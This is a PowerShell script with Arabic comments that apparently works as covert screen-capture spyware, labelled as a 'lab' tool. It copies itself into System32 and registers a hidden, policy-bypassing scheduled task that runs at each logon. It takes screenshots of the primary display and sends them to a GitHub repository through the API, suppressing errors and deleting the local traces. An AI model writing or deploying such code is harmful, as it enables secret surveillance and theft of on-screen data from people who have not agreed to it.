# ==========================================
# إعدادات المستخدم والمستودع
# ==========================================
$token = ''
$owner = 'ghost-mvt'
$repo = 'XUZ'
$scriptPath = "C:\Windows\System32\screenshot_bot.ps1" # مكان تخزين السكربت
$taskName = "LabAutoScreenshot"

# ==========================================
# وظيفة التقاط الشاشة والرفع
# ==========================================
function Perform-Task {
    $screenshotPath = "$env:TEMP\lab_capture.png"
    $remotePath = "uploads/capture_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()

    $bytes = [System.IO.File]::ReadAllBytes($screenshotPath)
    $base64Content = [System.Convert]::ToBase64String($bytes)
    $apiUrl = "https://api.github.com/repos/$owner/$repo/contents/$remotePath"

    $headers = @{
        "Authorization" = "token $token"
        "Accept"        = "application/vnd.github.v3+json"
        "User-Agent"    = "PowerShell-Script"
    }
    $body = @{ "message" = "Automated Lab Screenshot"; "content" = $base64Content } | ConvertTo-Json
    
    try { Invoke-RestMethod -Uri $apiUrl -Method Put -Headers $headers -Body $body -ContentType "application/json" } catch {}
    Remove-Item $screenshotPath -ErrorAction SilentlyContinue
}

# ==========================================
# منطق التثبيت والأتمتة
# ==========================================
if (-not (Test-Path $scriptPath)) {
    $MyInvocation.MyCommand.Path | Copy-Item -Destination $scriptPath
}

if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn -Delay 00:00:30
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Force
}

# تشغيل المهمة فوراً عند البدء
Perform-Task
